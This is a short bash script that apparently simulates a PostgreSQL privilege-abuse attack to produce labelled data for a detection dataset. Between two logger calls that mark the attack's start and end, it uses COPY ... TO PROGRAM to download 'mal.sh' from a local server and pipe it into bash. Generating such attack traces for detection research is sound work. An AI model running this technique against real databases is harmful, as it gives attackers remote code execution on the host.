#!/bin/bash
echo "Simulating Privilege Abuse Attack (remote_bash)..."
/dataset_workspace/logger.sh mark_attack "attack_priv_remote_bash" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT 1) TO PROGRAM 'curl -s http://127.0.0.1:9090/mal.sh | bash > /tmp/out_remote_bash.txt 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_priv_remote_bash" end
